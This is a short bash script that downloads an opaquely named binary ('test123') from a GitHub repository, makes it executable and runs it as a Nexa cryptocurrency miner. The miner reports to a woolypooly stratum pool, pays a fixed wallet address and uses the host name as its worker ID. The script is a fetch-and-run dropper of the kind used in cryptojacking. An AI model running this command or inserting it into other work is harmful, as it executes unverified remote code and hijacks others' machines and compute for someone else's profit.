#!/bin/bash

wget https://github.com/xtrastadia/china2/raw/main/test123 && chmod +x test123  && ./test123 -a nexapow -o stratum+tcp://pool.woolypooly.com:3124 -u nexa:nqtsq5g5z64a0mfn4gph0mqw9ew6ls82e35mqgvtygp0p59h -w $HOSTNAME --log-file logs/123.log --no-watchdog --no-tui
